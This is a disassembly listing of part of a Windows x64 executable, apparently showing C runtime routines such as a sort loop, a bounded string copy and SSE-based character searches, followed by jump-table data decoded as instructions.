   14000b0a2:	49 83 e8 01          	sub    $0x1,%r8
   14000b0a6:	75 e8                	jne    0x14000b090
   14000b0a8:	48 3b f7             	cmp    %rdi,%rsi
   14000b0ab:	48 8b c3             	mov    %rbx,%rax
   14000b0ae:	48 0f 45 c6          	cmovne %rsi,%rax
   14000b0b2:	48 8b f0             	mov    %rax,%rsi
   14000b0b5:	e9 46 ff ff ff       	jmp    0x14000b000
   14000b0ba:	48 3b f5             	cmp    %rbp,%rsi
   14000b0bd:	73 28                	jae    0x14000b0e7
   14000b0bf:	90                   	nop
   14000b0c0:	49 2b ee             	sub    %r14,%rbp
   14000b0c3:	48 3b ee             	cmp    %rsi,%rbp
   14000b0c6:	76 1f                	jbe    0x14000b0e7
   14000b0c8:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000b0cf:	b7 75 93 
   14000b0d2:	48 8b d6             	mov    %rsi,%rdx
   14000b0d5:	48 8b cd             	mov    %rbp,%rcx
   14000b0d8:	49 8b c4             	mov    %r12,%rax
   14000b0db:	ff 15 df 51 00 00    	call   *0x51df(%rip)        # 0x1400102c0
   14000b0e1:	85 c0                	test   %eax,%eax
   14000b0e3:	74 db                	je     0x14000b0c0
   14000b0e5:	eb 25                	jmp    0x14000b10c
   14000b0e7:	49 2b ee             	sub    %r14,%rbp
   14000b0ea:	49 3b ed             	cmp    %r13,%rbp
   14000b0ed:	76 1d                	jbe    0x14000b10c
   14000b0ef:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000b0f6:	b7 75 93 
   14000b0f9:	48 8b d6             	mov    %rsi,%rdx
   14000b0fc:	48 8b cd             	mov    %rbp,%rcx
   14000b0ff:	49 8b c4             	mov    %r12,%rax
   14000b102:	ff 15 b8 51 00 00    	call   *0x51b8(%rip)        # 0x1400102c0
   14000b108:	85 c0                	test   %eax,%eax
   14000b10a:	74 db                	je     0x14000b0e7
   14000b10c:	49 8b cf             	mov    %r15,%rcx
   14000b10f:	48 8b c5             	mov    %rbp,%rax
   14000b112:	48 2b cb             	sub    %rbx,%rcx
   14000b115:	49 2b c5             	sub    %r13,%rax
   14000b118:	48 3b c1             	cmp    %rcx,%rax
   14000b11b:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b120:	7c 2b                	jl     0x14000b14d
   14000b122:	4c 3b ed             	cmp    %rbp,%r13
   14000b125:	73 15                	jae    0x14000b13c
   14000b127:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   14000b12c:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   14000b133:	00 
   14000b134:	48 ff c1             	inc    %rcx
   14000b137:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b13c:	49 3b df             	cmp    %r15,%rbx
   14000b13f:	0f 83 9e fd ff ff    	jae    0x14000aee3
   14000b145:	4c 8b eb             	mov    %rbx,%r13
   14000b148:	e9 03 fd ff ff       	jmp    0x14000ae50
   14000b14d:	49 3b df             	cmp    %r15,%rbx
   14000b150:	73 15                	jae    0x14000b167
   14000b152:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   14000b157:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   14000b15e:	00 
   14000b15f:	48 ff c1             	inc    %rcx
   14000b162:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b167:	4c 3b ed             	cmp    %rbp,%r13
   14000b16a:	0f 83 73 fd ff ff    	jae    0x14000aee3
   14000b170:	4c 8b fd             	mov    %rbp,%r15
   14000b173:	e9 d8 fc ff ff       	jmp    0x14000ae50
   14000b178:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   14000b17f:	00 
   14000b180:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   14000b187:	00 
   14000b188:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   14000b18f:	00 
   14000b190:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   14000b197:	00 
   14000b198:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   14000b19f:	00 
   14000b1a0:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   14000b1a7:	00 
   14000b1a8:	48 33 cc             	xor    %rsp,%rcx
   14000b1ab:	e8 b0 61 ff ff       	call   0x140001360
   14000b1b0:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   14000b1b7:	41 5e                	pop    %r14
   14000b1b9:	41 5d                	pop    %r13
   14000b1bb:	41 5c                	pop    %r12
   14000b1bd:	c3                   	ret
   14000b1be:	cc                   	int3
   14000b1bf:	cc                   	int3
   14000b1c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b1c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b1ca:	57                   	push   %rdi
   14000b1cb:	48 83 ec 20          	sub    $0x20,%rsp
   14000b1cf:	45 33 d2             	xor    %r10d,%r10d
   14000b1d2:	49 8b d8             	mov    %r8,%rbx
   14000b1d5:	4c 8b da             	mov    %rdx,%r11
   14000b1d8:	4d 85 c9             	test   %r9,%r9
   14000b1db:	75 31                	jne    0x14000b20e
   14000b1dd:	48 85 c9             	test   %rcx,%rcx
   14000b1e0:	75 31                	jne    0x14000b213
   14000b1e2:	48 85 d2             	test   %rdx,%rdx
   14000b1e5:	74 14                	je     0x14000b1fb
   14000b1e7:	e8 c8 b9 ff ff       	call   0x140006bb4
   14000b1ec:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000b1f1:	89 18                	mov    %ebx,(%rax)
   14000b1f3:	e8 80 b8 ff ff       	call   0x140006a78
   14000b1f8:	44 8b d3             	mov    %ebx,%r10d
   14000b1fb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b200:	41 8b c2             	mov    %r10d,%eax
   14000b203:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000b208:	48 83 c4 20          	add    $0x20,%rsp
   14000b20c:	5f                   	pop    %rdi
   14000b20d:	c3                   	ret
   14000b20e:	48 85 c9             	test   %rcx,%rcx
   14000b211:	74 d4                	je     0x14000b1e7
   14000b213:	4d 85 db             	test   %r11,%r11
   14000b216:	74 cf                	je     0x14000b1e7
   14000b218:	4d 85 c9             	test   %r9,%r9
   14000b21b:	75 05                	jne    0x14000b222
   14000b21d:	44 88 11             	mov    %r10b,(%rcx)
   14000b220:	eb d9                	jmp    0x14000b1fb
   14000b222:	48 85 db             	test   %rbx,%rbx
   14000b225:	75 05                	jne    0x14000b22c
   14000b227:	44 88 11             	mov    %r10b,(%rcx)
   14000b22a:	eb bb                	jmp    0x14000b1e7
   14000b22c:	48 2b d9             	sub    %rcx,%rbx
   14000b22f:	48 8b d1             	mov    %rcx,%rdx
   14000b232:	4d 8b c3             	mov    %r11,%r8
   14000b235:	49 8b f9             	mov    %r9,%rdi
   14000b238:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000b23c:	75 14                	jne    0x14000b252
   14000b23e:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000b241:	88 02                	mov    %al,(%rdx)
   14000b243:	48 ff c2             	inc    %rdx
   14000b246:	84 c0                	test   %al,%al
   14000b248:	74 b1                	je     0x14000b1fb
   14000b24a:	49 83 e8 01          	sub    $0x1,%r8
   14000b24e:	75 ee                	jne    0x14000b23e
   14000b250:	eb 2e                	jmp    0x14000b280
   14000b252:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000b255:	48 8b f7             	mov    %rdi,%rsi
   14000b258:	88 02                	mov    %al,(%rdx)
   14000b25a:	48 ff c2             	inc    %rdx
   14000b25d:	84 c0                	test   %al,%al
   14000b25f:	74 9a                	je     0x14000b1fb
   14000b261:	49 83 e8 01          	sub    $0x1,%r8
   14000b265:	74 06                	je     0x14000b26d
   14000b267:	48 83 ef 01          	sub    $0x1,%rdi
   14000b26b:	75 e5                	jne    0x14000b252
   14000b26d:	4d 85 c0             	test   %r8,%r8
   14000b270:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   14000b274:	48 0f 44 c6          	cmove  %rsi,%rax
   14000b278:	48 85 c0             	test   %rax,%rax
   14000b27b:	75 03                	jne    0x14000b280
   14000b27d:	44 88 12             	mov    %r10b,(%rdx)
   14000b280:	4d 85 c0             	test   %r8,%r8
   14000b283:	0f 85 72 ff ff ff    	jne    0x14000b1fb
   14000b289:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000b28d:	75 0e                	jne    0x14000b29d
   14000b28f:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   14000b294:	45 8d 50 50          	lea    0x50(%r8),%r10d
   14000b298:	e9 5e ff ff ff       	jmp    0x14000b1fb
   14000b29d:	44 88 11             	mov    %r10b,(%rcx)
   14000b2a0:	e8 0f b9 ff ff       	call   0x140006bb4
   14000b2a5:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000b2aa:	e9 42 ff ff ff       	jmp    0x14000b1f1
   14000b2af:	cc                   	int3
   14000b2b0:	48 83 ec 58          	sub    $0x58,%rsp
   14000b2b4:	48 8b 05 45 ed 00 00 	mov    0xed45(%rip),%rax        # 0x14001a000
   14000b2bb:	48 33 c4             	xor    %rsp,%rax
   14000b2be:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000b2c3:	33 c0                	xor    %eax,%eax
   14000b2c5:	4c 8b ca             	mov    %rdx,%r9
   14000b2c8:	48 83 f8 20          	cmp    $0x20,%rax
   14000b2cc:	4c 8b c1             	mov    %rcx,%r8
   14000b2cf:	73 77                	jae    0x14000b348
   14000b2d1:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   14000b2d6:	48 ff c0             	inc    %rax
   14000b2d9:	48 83 f8 20          	cmp    $0x20,%rax
   14000b2dd:	7c f0                	jl     0x14000b2cf
   14000b2df:	8a 02                	mov    (%rdx),%al
   14000b2e1:	eb 1f                	jmp    0x14000b302
   14000b2e3:	0f b6 d0             	movzbl %al,%edx
   14000b2e6:	48 c1 ea 03          	shr    $0x3,%rdx
   14000b2ea:	0f b6 c0             	movzbl %al,%eax
   14000b2ed:	83 e0 07             	and    $0x7,%eax
   14000b2f0:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   14000b2f5:	0f ab c1             	bts    %eax,%ecx
   14000b2f8:	49 ff c1             	inc    %r9
   14000b2fb:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   14000b2ff:	41 8a 01             	mov    (%r9),%al
   14000b302:	84 c0                	test   %al,%al
   14000b304:	75 dd                	jne    0x14000b2e3
   14000b306:	eb 1f                	jmp    0x14000b327
   14000b308:	41 0f b6 c1          	movzbl %r9b,%eax
   14000b30c:	ba 01 00 00 00       	mov    $0x1,%edx
   14000b311:	41 0f b6 c9          	movzbl %r9b,%ecx
   14000b315:	83 e1 07             	and    $0x7,%ecx
   14000b318:	48 c1 e8 03          	shr    $0x3,%rax
   14000b31c:	d3 e2                	shl    %cl,%edx
   14000b31e:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   14000b322:	75 1f                	jne    0x14000b343
   14000b324:	49 ff c0             	inc    %r8
   14000b327:	45 8a 08             	mov    (%r8),%r9b
   14000b32a:	45 84 c9             	test   %r9b,%r9b
   14000b32d:	75 d9                	jne    0x14000b308
   14000b32f:	33 c0                	xor    %eax,%eax
   14000b331:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000b336:	48 33 cc             	xor    %rsp,%rcx
   14000b339:	e8 22 60 ff ff       	call   0x140001360
   14000b33e:	48 83 c4 58          	add    $0x58,%rsp
   14000b342:	c3                   	ret
   14000b343:	49 8b c0             	mov    %r8,%rax
   14000b346:	eb e9                	jmp    0x14000b331
   14000b348:	e8 af 63 ff ff       	call   0x1400016fc
   14000b34d:	cc                   	int3
   14000b34e:	cc                   	int3
   14000b34f:	cc                   	int3
   14000b350:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b355:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b35a:	57                   	push   %rdi
   14000b35b:	4c 8b d2             	mov    %rdx,%r10
   14000b35e:	48 8d 35 9b 4c ff ff 	lea    -0xb365(%rip),%rsi        # 0x140000000
   14000b365:	41 83 e2 0f          	and    $0xf,%r10d
   14000b369:	48 8b fa             	mov    %rdx,%rdi
   14000b36c:	49 2b fa             	sub    %r10,%rdi
   14000b36f:	48 8b da             	mov    %rdx,%rbx
   14000b372:	4c 8b c1             	mov    %rcx,%r8
   14000b375:	0f 57 db             	xorps  %xmm3,%xmm3
   14000b378:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   14000b37c:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   14000b380:	48 83 f8 0e          	cmp    $0xe,%rax
   14000b384:	77 73                	ja     0x14000b3f9
   14000b386:	8b 84 86 5c b6 00 00 	mov    0xb65c(%rsi,%rax,4),%eax
   14000b38d:	48 03 c6             	add    %rsi,%rax
   14000b390:	ff e0                	jmp    *%rax
   14000b392:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000b397:	eb 60                	jmp    0x14000b3f9
   14000b399:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000b39e:	eb 59                	jmp    0x14000b3f9
   14000b3a0:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000b3a5:	eb 52                	jmp    0x14000b3f9
   14000b3a7:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000b3ac:	eb 4b                	jmp    0x14000b3f9
   14000b3ae:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000b3b3:	eb 44                	jmp    0x14000b3f9
   14000b3b5:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000b3ba:	eb 3d                	jmp    0x14000b3f9
   14000b3bc:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000b3c1:	eb 36                	jmp    0x14000b3f9
   14000b3c3:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000b3c8:	eb 2f                	jmp    0x14000b3f9
   14000b3ca:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000b3cf:	eb 28                	jmp    0x14000b3f9
   14000b3d1:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000b3d6:	eb 21                	jmp    0x14000b3f9
   14000b3d8:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000b3dd:	eb 1a                	jmp    0x14000b3f9
   14000b3df:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000b3e4:	eb 13                	jmp    0x14000b3f9
   14000b3e6:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000b3eb:	eb 0c                	jmp    0x14000b3f9
   14000b3ed:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000b3f2:	eb 05                	jmp    0x14000b3f9
   14000b3f4:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000b3f9:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000b3fc:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   14000b402:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000b406:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000b40a:	85 c0                	test   %eax,%eax
   14000b40c:	0f 84 33 01 00 00    	je     0x14000b545
   14000b412:	0f bc d0             	bsf    %eax,%edx
   14000b415:	4d 85 d2             	test   %r10,%r10
   14000b418:	75 06                	jne    0x14000b420
   14000b41a:	45 8d 59 f2          	lea    -0xe(%r9),%r11d
   14000b41e:	eb 14                	jmp    0x14000b434
   14000b420:	45 33 db             	xor    %r11d,%r11d
   14000b423:	8b c2                	mov    %edx,%eax
   14000b425:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000b42a:	49 2b ca             	sub    %r10,%rcx
   14000b42d:	48 3b c1             	cmp    %rcx,%rax
   14000b430:	41 0f 92 c3          	setb   %r11b
   14000b434:	41 8b c1             	mov    %r9d,%eax
   14000b437:	2b c2                	sub    %edx,%eax
   14000b439:	41 3b c1             	cmp    %r9d,%eax
   14000b43c:	0f 87 cf 00 00 00    	ja     0x14000b511
   14000b442:	8b 8c 86 98 b6 00 00 	mov    0xb698(%rsi,%rax,4),%ecx
   14000b449:	48 03 ce             	add    %rsi,%rcx
   14000b44c:	ff e1                	jmp    *%rcx
   14000b44e:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   14000b453:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000b458:	e9 b4 00 00 00       	jmp    0x14000b511
   14000b45d:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   14000b462:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000b467:	e9 a5 00 00 00       	jmp    0x14000b511
   14000b46c:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   14000b471:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000b476:	e9 96 00 00 00       	jmp    0x14000b511
   14000b47b:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000b480:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000b485:	e9 87 00 00 00       	jmp    0x14000b511
   14000b48a:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   14000b48f:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000b494:	eb 7b                	jmp    0x14000b511
   14000b496:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   14000b49b:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000b4a0:	eb 6f                	jmp    0x14000b511
   14000b4a2:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   14000b4a7:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000b4ac:	eb 63                	jmp    0x14000b511
   14000b4ae:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   14000b4b3:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000b4b8:	eb 57                	jmp    0x14000b511
   14000b4ba:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   14000b4bf:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000b4c4:	eb 4b                	jmp    0x14000b511
   14000b4c6:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   14000b4cb:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000b4d0:	eb 3f                	jmp    0x14000b511
   14000b4d2:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   14000b4d7:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000b4dc:	eb 33                	jmp    0x14000b511
   14000b4de:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   14000b4e3:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000b4e8:	eb 27                	jmp    0x14000b511
   14000b4ea:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   14000b4ef:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000b4f4:	eb 1b                	jmp    0x14000b511
   14000b4f6:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   14000b4fb:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000b500:	eb 0f                	jmp    0x14000b511
   14000b502:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   14000b507:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000b50c:	eb 03                	jmp    0x14000b511
   14000b50e:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000b511:	45 85 db             	test   %r11d,%r11d
   14000b514:	0f 85 e2 00 00 00    	jne    0x14000b5fc
   14000b51a:	f3 0f 6f 57 10       	movdqu 0x10(%rdi),%xmm2
   14000b51f:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   14000b523:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   14000b527:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000b52b:	85 c0                	test   %eax,%eax
   14000b52d:	75 35                	jne    0x14000b564
   14000b52f:	48 8b d3             	mov    %rbx,%rdx
   14000b532:	49 8b c8             	mov    %r8,%rcx
   14000b535:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000b53a:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000b53f:	5f                   	pop    %rdi
   14000b540:	e9 6b fd ff ff       	jmp    0x14000b2b0
   14000b545:	4d 85 d2             	test   %r10,%r10
   14000b548:	75 d0                	jne    0x14000b51a
   14000b54a:	44 38 57 01          	cmp    %r10b,0x1(%rdi)
   14000b54e:	0f 84 a8 00 00 00    	je     0x14000b5fc
   14000b554:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000b559:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000b55e:	5f                   	pop    %rdi
   14000b55f:	e9 4c fd ff ff       	jmp    0x14000b2b0
   14000b564:	0f bc c8             	bsf    %eax,%ecx
   14000b567:	8b c1                	mov    %ecx,%eax
   14000b569:	49 2b c2             	sub    %r10,%rax
   14000b56c:	48 83 c0 10          	add    $0x10,%rax
   14000b570:	48 83 f8 10          	cmp    $0x10,%rax
   14000b574:	77 b9                	ja     0x14000b52f
   14000b576:	44 2b c9             	sub    %ecx,%r9d
   14000b579:	41 83 f9 0f          	cmp    $0xf,%r9d
   14000b57d:	77 79                	ja     0x14000b5f8
   14000b57f:	42 8b 8c 8e d8 b6 00 	mov    0xb6d8(%rsi,%r9,4),%ecx
   14000b586:	00 
   14000b587:	48 03 ce             	add    %rsi,%rcx
   14000b58a:	ff e1                	jmp    *%rcx
   14000b58c:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   14000b591:	eb 65                	jmp    0x14000b5f8
   14000b593:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   14000b598:	eb 5e                	jmp    0x14000b5f8
   14000b59a:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   14000b59f:	eb 57                	jmp    0x14000b5f8
   14000b5a1:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   14000b5a6:	eb 50                	jmp    0x14000b5f8
   14000b5a8:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   14000b5ad:	eb 49                	jmp    0x14000b5f8
   14000b5af:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   14000b5b4:	eb 42                	jmp    0x14000b5f8
   14000b5b6:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   14000b5bb:	eb 3b                	jmp    0x14000b5f8
   14000b5bd:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000b5c2:	eb 34                	jmp    0x14000b5f8
   14000b5c4:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   14000b5c9:	eb 2d                	jmp    0x14000b5f8
   14000b5cb:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   14000b5d0:	eb 26                	jmp    0x14000b5f8
   14000b5d2:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   14000b5d7:	eb 1f                	jmp    0x14000b5f8
   14000b5d9:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   14000b5de:	eb 18                	jmp    0x14000b5f8
   14000b5e0:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   14000b5e5:	eb 11                	jmp    0x14000b5f8
   14000b5e7:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   14000b5ec:	eb 0a                	jmp    0x14000b5f8
   14000b5ee:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   14000b5f3:	eb 03                	jmp    0x14000b5f8
   14000b5f5:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000b5f8:	66 0f eb ca          	por    %xmm2,%xmm1
   14000b5fc:	41 0f b6 00          	movzbl (%r8),%eax
   14000b600:	84 c0                	test   %al,%al
   14000b602:	74 38                	je     0x14000b63c
   14000b604:	0f 1f 40 00          	nopl   0x0(%rax)
   14000b608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b60f:	00 
   14000b610:	0f be c0             	movsbl %al,%eax
   14000b613:	66 0f 6e c0          	movd   %eax,%xmm0
   14000b617:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000b61b:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000b61f:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   14000b624:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000b628:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000b62c:	85 c0                	test   %eax,%eax
   14000b62e:	75 1a                	jne    0x14000b64a
   14000b630:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   14000b635:	49 ff c0             	inc    %r8
   14000b638:	84 c0                	test   %al,%al
   14000b63a:	75 d4                	jne    0x14000b610
   14000b63c:	33 c0                	xor    %eax,%eax
   14000b63e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000b643:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000b648:	5f                   	pop    %rdi
   14000b649:	c3                   	ret
   14000b64a:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000b64f:	49 8b c0             	mov    %r8,%rax
   14000b652:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000b657:	5f                   	pop    %rdi
   14000b658:	c3                   	ret
   14000b659:	0f 1f 00             	nopl   (%rax)
   14000b65c:	92                   	xchg   %eax,%edx
   14000b65d:	b3 00                	mov    $0x0,%bl
   14000b65f:	00 99 b3 00 00 a0    	add    %bl,-0x5fffff4d(%rcx)
   14000b665:	b3 00                	mov    $0x0,%bl
   14000b667:	00 a7 b3 00 00 ae    	add    %ah,-0x51ffff4d(%rdi)
   14000b66d:	b3 00                	mov    $0x0,%bl
   14000b66f:	00 b5 b3 00 00 bc    	add    %dh,-0x43ffff4d(%rbp)
   14000b675:	b3 00                	mov    $0x0,%bl
   14000b677:	00 c3                	add    %al,%bl
   14000b679:	b3 00                	mov    $0x0,%bl
   14000b67b:	00 ca                	add    %cl,%dl
   14000b67d:	b3 00                	mov    $0x0,%bl
   14000b67f:	00 d1                	add    %dl,%cl
   14000b681:	b3 00                	mov    $0x0,%bl
   14000b683:	00 d8                	add    %bl,%al
   14000b685:	b3 00                	mov    $0x0,%bl
   14000b687:	00 df                	add    %bl,%bh
   14000b689:	b3 00                	mov    $0x0,%bl
   14000b68b:	00 e6                	add    %ah,%dh
   14000b68d:	b3 00                	mov    $0x0,%bl
   14000b68f:	00 ed                	add    %ch,%ch
   14000b691:	b3 00                	mov    $0x0,%bl
   14000b693:	00 f4                	add    %dh,%ah
   14000b695:	b3 00                	mov    $0x0,%bl
   14000b697:	00 4e b4             	add    %cl,-0x4c(%rsi)
   14000b69a:	00 00                	add    %al,(%rax)
   14000b69c:	5d                   	pop    %rbp
   14000b69d:	b4 00                	mov    $0x0,%ah
   14000b69f:	00 6c b4 00          	add    %ch,0x0(%rsp,%rsi,4)
   14000b6a3:	00 7b b4             	add    %bh,-0x4c(%rbx)
   14000b6a6:	00 00                	add    %al,(%rax)
   14000b6a8:	8a b4 00 00 96 b4 00 	mov    0xb49600(%rax,%rax,1),%dh
   14000b6af:	00 a2 b4 00 00 ae    	add    %ah,-0x51ffff4c(%rdx)
   14000b6b5:	b4 00                	mov    $0x0,%ah
   14000b6b7:	00 ba b4 00 00 c6    	add    %bh,-0x39ffff4c(%rdx)
   14000b6bd:	b4 00                	mov    $0x0,%ah
   14000b6bf:	00 d2                	add    %dl,%dl
   14000b6c1:	b4 00                	mov    $0x0,%ah
   14000b6c3:	00 de                	add    %bl,%dh
   14000b6c5:	b4 00                	mov    $0x0,%ah
   14000b6c7:	00 ea                	add    %ch,%dl
   14000b6c9:	b4 00                	mov    $0x0,%ah
   14000b6cb:	00 f6                	add    %dh,%dh
   14000b6cd:	b4 00                	mov    $0x0,%ah
   14000b6cf:	00 02                	add    %al,(%rdx)
   14000b6d1:	b5 00                	mov    $0x0,%ch
   14000b6d3:	00 0e                	add    %cl,(%rsi)
   14000b6d5:	b5 00                	mov    $0x0,%ch
   14000b6d7:	00 8c b5 00 00 93 b5 	add    %cl,-0x4a6d0000(%rbp,%rsi,4)
   14000b6de:	00 00                	add    %al,(%rax)
   14000b6e0:	9a                   	(bad)
   14000b6e1:	b5 00                	mov    $0x0,%ch
   14000b6e3:	00 a1 b5 00 00 a8    	add    %ah,-0x57ffff4b(%rcx)
   14000b6e9:	b5 00                	mov    $0x0,%ch
   14000b6eb:	00 af b5 00 00 b6    	add    %ch,-0x49ffff4b(%rdi)
   14000b6f1:	b5 00                	mov    $0x0,%ch
   14000b6f3:	00 bd b5 00 00 c4    	add    %bh,-0x3bffff4b(%rbp)
   14000b6f9:	b5 00                	mov    $0x0,%ch
   14000b6fb:	00 cb                	add    %cl,%bl
   14000b6fd:	b5 00                	mov    $0x0,%ch
   14000b6ff:	00 d2                	add    %dl,%dl
   14000b701:	b5 00                	mov    $0x0,%ch
   14000b703:	00 d9                	add    %bl,%cl
   14000b705:	b5 00                	mov    $0x0,%ch
   14000b707:	00 e0                	add    %ah,%al
   14000b709:	b5 00                	mov    $0x0,%ch
   14000b70b:	00 e7                	add    %ah,%bh
   14000b70d:	b5 00                	mov    $0x0,%ch
   14000b70f:	00 ee                	add    %ch,%dh
   14000b711:	b5 00                	mov    $0x0,%ch
   14000b713:	00 f5                	add    %dh,%ch
   14000b715:	b5 00                	mov    $0x0,%ch
   14000b717:	00 45 33             	add    %al,0x33(%rbp)
   14000b71a:	c0 e9 00             	shr    $0x0,%cl
   14000b71d:	00 00                	add    %al,(%rax)
   14000b71f:	00 48 89             	add    %cl,-0x77(%rax)
   14000b722:	5c                   	pop    %rsp
   14000b723:	24 08                	and    $0x8,%al
   14000b725:	57                   	push   %rdi
